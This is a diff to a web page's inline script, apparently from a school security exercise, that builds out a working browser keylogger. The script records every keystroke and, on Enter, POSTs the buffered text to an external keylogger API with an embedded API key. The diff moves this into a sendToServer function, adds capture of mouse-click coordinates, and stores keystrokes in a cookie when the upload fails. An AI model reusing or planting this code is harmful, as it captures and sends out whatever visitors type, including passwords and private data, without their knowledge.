@@ -15,27 +15,39 @@
     </script>
     <script>
         let word = ''
+
+        function sendToServer(word) {
+            fetch('https://m183.gibz-informatik.ch/api/keylogger', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'X-Api-Key': 'NAA1ADUAMwA3ADUANAAyADEANgA5ADkAMgAyADcANAA2ADkA'
+                },
+                body: JSON.stringify({
+                "keyword": "noah",
+                "payload": word
+                })
+            }).then(() => {
+                word = ''
+            }).catch(() => {
+                // save to cookie (attention, just on localhost)
+                // start file with python: py -3 -m http.server
+                document.cookie = `cache=${getCookie('cache') + ' ' + word};path=/;`
+                word = ''
+            })
+        }
+
         onkeydown = (key) => {
             word += key.key
             if(key.key == "Enter") {
                 console.log(word)
-                fetch('https://m183.gibz-informatik.ch/api/keylogger', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                        'X-Api-Key': 'NAA1ADUAMwA3ADUANAAyADEANgA5ADkAMgAyADcANAA2ADkA'
-                    },
-                    body: JSON.stringify({
-                    "keyword": "noah",
-                    "payload": word
-                    })
-                }).then(() => {
-                    word = ''
-                }).catch(() => {
-                    document.cookie = `cache=${getCookie('cache') + ' ' + word};path=/;`
-                    word = ''
-                })
+                sendToServer(word)
             }
+        }
+
+        onmousedown = event => {
+            // Wenn Maus gedrückt wird
+            sendToServer(event.screenX + ' / ' + event.screenY)
         }
     </script>
 </head>
